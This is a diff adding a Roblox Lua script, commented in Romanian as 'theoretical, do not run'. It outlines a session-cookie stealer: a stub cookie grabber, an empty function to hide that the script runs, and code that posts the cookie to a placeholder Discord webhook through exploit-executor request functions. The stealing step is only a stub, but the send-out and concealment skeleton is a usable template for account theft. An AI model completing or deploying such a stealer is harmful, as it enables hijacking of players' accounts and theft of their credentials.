@@ -1,0 +1,43 @@
+-- TEORETIC - NU RULA
+-- DOAR PENTRU ÎNȚELEGEREA CONCEPTULUI
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- Simulare (în realitate, cookie-ul nu e accesibil direct așa)
+-- Scriptul ar trebui să exploteze o vulnerabilitate
+local function getCookie()
+    -- În realitate, ar trebui să extragă cookie-ul din memoria Roblox
+    -- sau printr-o metodă mai complexă
+    return "NU ESTE POSIBIL DIRECT"
+end
+
+-- Trimite la Discord webhook
+local function sendToDiscord(data)
+    local request = syn and syn.request or http_request or request
+    if request then
+        request({
+            Url = "WEBHOOK_URL_AICI",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({content = data})
+        })
+    end
+end
+
+-- Ascunde activitatea
+local function hideActivity()
+    -- Cod pentru a ascunde faptul că rulează
+end
+
+-- Main
+local function main()
+    hideActivity()
+    local cookie = getCookie()
+    if cookie then
+        sendToDiscord("Cookie: " .. cookie)
+    end
+end
+
+main()
